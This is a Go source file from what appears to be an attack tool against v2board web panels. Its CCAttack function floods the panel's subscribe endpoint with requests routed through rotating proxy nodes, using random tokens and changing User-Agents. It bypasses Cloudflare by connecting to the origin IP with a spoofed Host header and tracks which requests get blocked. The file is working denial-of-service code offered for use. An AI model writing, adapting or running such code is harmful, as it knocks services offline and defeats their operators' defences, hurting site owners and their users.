package utils

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"github.com/google/uuid"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	C "github.com/Dreamacro/clash/constant"
	"github.com/go-resty/resty/v2"

	"github.com/thank243/v2board_cc/config"
)

type Nodes struct {
	C.Proxy
	CFCheck bool
}

func urlToMetadata(rawURL string) (addr C.Metadata, err error) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return
	}

	port := u.Port()
	if port == "" {
		switch u.Scheme {
		case "https":
			port = "443"
		case "http":
			port = "80"
		default:
			err = fmt.Errorf("%s scheme not Support", rawURL)
			return
		}
	}

	addr = C.Metadata{
		AddrType: C.AtypDomainName,
		Host:     u.Hostname(),
		DstIP:    nil,
		DstPort:  port,
	}
	return
}

func CCAttack(p *Nodes, counts *int, res *resty.Response, ua *UserAgent) (err error) {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	baseURL, err := url.Parse(config.Cfg.OriginIP)
	if err != nil {
		return
	}
	baseURL.Path = "api/v1/client/subscribe"
	params := url.Values{}
	params.Add("token", strings.ReplaceAll(uuid.New().String(), "-", ""))
	baseURL.RawQuery = params.Encode()

	addr, err := urlToMetadata(baseURL.String())
	if err != nil {
		return
	}

	instance, err := p.DialContext(ctx, &addr)
	if err != nil {
		return
	}
	defer func(instance C.Conn) {
		err = instance.Close()
		if err != nil {
			return
		}
	}(instance)

	transport := &http.Transport{DialContext: func(context.Context, string, string) (net.Conn, error) { return instance, nil }}

	resp, err := resty.New().
		SetTransport(transport).SetTLSClientConfig(&tls.Config{ServerName: config.Cfg.V2boardDomain}).
		R().SetHeaders(map[string]string{
		"User-Agent": ua.UA,
		"Host":       config.Cfg.V2boardDomain,
	}).
		SetContext(ctx).Get(baseURL.String())
	*counts++
	res = resp

	var buf map[string]interface{}
	_ = json.Unmarshal(resp.Body(), &buf)
	switch {
	case buf["data"] != nil:
		fmt.Printf("\n[%d] %d", *counts, resp.StatusCode())

	case buf["message"] != nil:
		fmt.Printf("\n[%d] %d %s [%s]", *counts, resp.StatusCode(), buf["message"], resp.Request.Header.Get("User-Agent"))

	case strings.Contains(resp.String(), "cloudflare") || strings.Contains(resp.String(), "error code:"):
		p.CFCheck = true
		ua.BannedCounts++

	case err == nil:
		fmt.Printf("\n[%d] %s", *counts, resp.Status())
	}
	return
}
